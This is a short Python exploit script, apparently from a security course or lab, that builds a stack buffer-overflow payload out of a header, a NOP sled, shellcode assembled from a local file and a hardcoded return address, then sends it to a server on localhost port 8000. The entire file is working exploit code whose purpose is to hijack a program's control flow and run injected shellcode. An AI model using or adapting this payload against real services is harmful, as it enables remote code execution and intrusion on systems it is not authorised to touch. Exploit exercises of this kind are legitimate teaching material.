#!/usr/bin/python

import os, socket
import assemble

HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


PATH_TO_SHELLCODE = './shellcode.asm'


def get_shellcode():
    return assemble.assemble_file(PATH_TO_SHELLCODE)

def get_payload():
    
    shellcode = get_shellcode()
    return_address = "\x04\xe0\xff\xbf" # 0xbfffe040 
    nop_slide_end = "\x90" * 0
    nop_silde_start = "\x90" * (1044 - len(nop_slide_end) - len(return_address) - len(shellcode))
    
    return chr(0) * 2 + chr(4) + chr(21) + nop_silde_start + shellcode + nop_slide_end + return_address


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
